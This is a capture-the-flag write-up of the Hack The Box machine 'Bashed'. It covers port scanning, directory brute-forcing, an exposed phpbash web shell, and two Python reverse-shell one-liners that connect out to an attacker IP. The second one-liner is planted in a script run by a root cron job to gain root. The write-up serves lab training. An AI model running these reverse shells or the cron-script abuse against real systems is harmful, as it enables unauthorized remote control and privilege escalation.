# [Bashed](https://www.hackthebox.com/machines/bashed)


```bash
rustscan -b 2000 10.10.10.68
```
![Alt text](img/image.png)


Directory brute-forcing

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.68/FUZZ
```

Then, I find 'uploads' directory and inside of this 'phpbash.php' file.

After searching , on 'dev' directory, there is also 'phpbash.php' file.
You can see live shell below.

![Alt text](img/image-1.png)


user.txt

![Alt text](img/image-2.png)


Here's we can see privileges for www-data on script-manager.

![Alt text](img/image-3.png)


Let's get reverse shell with python.

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.3",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Here's result of reverse shell.

![Alt text](img/image-4.png)

let's switch to scriptmanager user.

![Alt text](img/image-5.png)


Here we see scripts folder and one .py file and .txt file here.

![Alt text](img/image-6.png)

Then I looked that crontabs and see that this directory is running every 2 minutes.

```bash
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.3",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > exploit.py
```

![Alt text](img/image-7.png)


root.txt

![Alt text](img/image-8.png)